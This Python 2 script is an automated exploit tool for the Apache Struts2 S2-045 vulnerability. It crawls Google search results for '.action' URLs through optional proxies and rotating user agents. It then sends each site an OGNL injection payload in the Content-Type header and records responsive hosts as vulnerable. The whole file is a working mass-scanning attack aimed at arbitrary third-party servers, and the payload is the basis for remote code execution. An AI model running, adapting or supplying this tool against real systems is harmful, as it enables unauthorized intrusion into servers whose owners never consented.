#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Apache Struts2 S2-045 auto exploit
# with google search results crawler
#

import sys
import os
import time
import socket
import requests
import ConfigParser
import threading, Queue
import re, random, types
from bs4 import BeautifulSoup
from atexit import register


cp = ConfigParser.SafeConfigParser()
cp.read('crawler.conf')
proxies = {}
if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
    http_addr = cp.get('http', 'http_addr')
    http_port = int(cp.get('http', 'http_port'))
    proxies['https'] = 'https://%s:%d' % (http_addr, http_port)
elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port'):
    socks_addr = cp.get('socks', 'socks_addr')
    socks_port = int(cp.get('socks', 'socks_port'))
    proxies['https'] = 'socks5://%s:%d' % (socks_addr, socks_port)
base_url = cp.get('crawler', 'base_url')
results_per_page = 10
user_agents = []
vuln_num = 0
url_set = set()
url_queue = Queue.Queue()
vuln_queue = Queue.Queue()
lock = threading.Lock()


class SubThread(threading.Thread):

    def __init__(self, func, args):
        super(SubThread, self).__init__(name=func.__name__)
        self.func = func
        self.args = args

    def run(self):
        self.func(*self.args)


class GoogleAPI:

    """
    google search results crawler
    Create by Meibenjin
    Last updated: 2017-03-10
    """

    def __init__(self):
        timeout = 40
        socket.setdefaulttimeout(timeout)

    def random_sleep(self):
        sleeptime = random.randint(10, 30)
        time.sleep(sleeptime)

    # extract a url from a link
    def extract_url(self, href):
        url = ''
        pattern = re.compile(
            r'(?:http[s]?)?.*?(http[s]?://[^&]+)&', re.U | re.M)
        url_match = pattern.search(href)
        if url_match and url_match.lastindex > 0:
            url = url_match.group(1)
        return url.split('%3F', 1)[0]

    # extract serach results list from downloaded html file
    def extract_search_results(self, html):
        soup = BeautifulSoup(html, "html.parser")
        div = soup.find('div', id='search')
        if type(div) != types.NoneType:
            lis = div.findAll('div', {'class': 'g'})
            if len(lis) > 0:
                for li in lis:
                    h3 = li.find('h3', {'class': 'r'})
                    if type(h3) == types.NoneType:
                        continue
                    # extract url from h3 object
                    link = h3.find('a')
                    if type(link) == types.NoneType:
                        continue
                    url = link['href']
                    url = self.extract_url(url)
                    if cmp(url, '') == 0:
                        continue
                    if url in url_set:
                        continue
                    with lock:
                        print '\033[0;32m[*] [URL] %s\033[0m' % url
                    url_queue.put(url)
                    url_set.add(url)

    # search web
    def search(self, query, lang='en', num=results_per_page):
        if num % results_per_page == 0:
            pages = num / results_per_page
        else:
            pages = num / results_per_page + 1
        for p in xrange(0, pages):
            start = p * results_per_page
            url = '%s/search' % base_url
            payload = {
                'q': query,
                'start': start,
                'num': results_per_page,
                'hl': lang
            }
            retry = 3
            while retry > 0:
                try:
                    length = len(user_agents)
                    index = random.randint(0, length - 1)
                    user_agent = user_agents[index]
                    headers = {
                        'user-agent': user_agent,
                        'connection': 'keep-alive',
                        'accept-encoding': 'gzip',
                        'referer': base_url
                    }
                    response = requests.get(url, headers=headers, params=payload, proxies=proxies)
                    html = response.text
                    self.extract_search_results(html)
                    break
                except Exception, e:
                    with lock:
                        print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
                    self.random_sleep()
                    retry = retry - 1
                    continue


def load_user_agent():
    with open('./user_agents.txt', 'r') as fp:
        for line in fp.readlines():
            line = line.strip('\n')
            user_agents.append(line)


def crawler():
    with lock:
        print '\033[0;32m[*] crawler starting\033[0m'
    # Load use agent string from file
    load_user_agent()

    # Create a GoogleAPI instance
    api = GoogleAPI()

    # set expect search results to be crawled
    expect_num = int(cp.get('crawler', 'expect_num'))
    # if no parameters, read query keywords from file
    if len(sys.argv) < 2:
        # keyword = cp.get('crawler', 'keyword')
        keyword = 'ext:action'
        api.search(keyword, num=expect_num)
    else:
        keyword = sys.argv[1]
        api.search(keyword, num=expect_num)


def poccheck(timeout):
    global vuln_num
    with lock:
        print '\033[0;32m[*] poc starting\033[0m'
    poc = "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    poc += "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."
    poc += "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('fuck')).(#o.close())}"
    S2_045 = {
        "poc": poc,
        "key": "fuck"
    }
    while True:
        url = url_queue.get()
        with lock:
            print '\033[0;33m[*] [POC] %s\033[0m' % url
        headers = {
            'content-type': S2_045["poc"],
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'
        }
        response = requests.get(url, headers=headers)
        try:
            res_html = response.text
        except Exception, e:
            with lock:
                print '\033[0;31m[!] [POC_ERROR] %s\033[0m' % url
                print '\033[0;31m[!] [POC_ERROR]\033[0m', e
        else:
            if S2_045['key'] in res_html:
                with lock:
                    print '\033[1;32m[*] [VULNERABLE] %s\033[0m' % url
                    vuln_queue.put(url)
                    vuln_num += 1
                    with open('./vulnerable.txt', 'a') as vulnerable:
                        vulnerable.write(url+'\n')


def banner():
    print " ____ ____        ___  _  _  ____  "
    print "/ ___|___ \      / _ \| || || ___| "
    print "\___ \ __) |____| | | | || ||___ \ "
    print " ___) / __/_____| |_| |__   _|__) |"
    print "|____/_____|     \___/   |_||____/ "
    print "                                   "
    print "    _         _        ____                 "
    print "   / \  _   _| |_ ___ |  _ \__      ___ __  "
    print "  / _ \| | | | __/ _ \| |_) \ \ /\ / / '_ \ "
    print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
    print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
    print "                                            "
    print "                              {alpha 1.0.4} "
    print "                                            "


@register
def atexit():
    if vuln_num == 0:
        print '\033[1;33m\r[*] no vulnerable url have found\033[0m'
    else:
        url_num = len(url_set)
        vuln_rate = (vuln_num / float(url_num)) * 100
        print '\033[1;33m\r[*] %d url are vulnerable in %d (%d%%)\033[0m' % (vuln_num, url_num, vuln_rate)
    print '\r  '
    print '[*] shutting down at', time.strftime("%H:%M:%S")
    print ''


def main():
    banner()
    if proxies:
        print '[*] [PROXY] %s' % proxies['https']
    print ''
    print '[*] starting at', time.strftime("%H:%M:%S")
    print ''
    try:
        poc_thread = SubThread(poccheck, (10, ))
        poc_thread.daemon = True
        poc_thread.start()
        crawler()
    except KeyboardInterrupt:
        sys.exit()
    

if __name__ == '__main__':
    main()
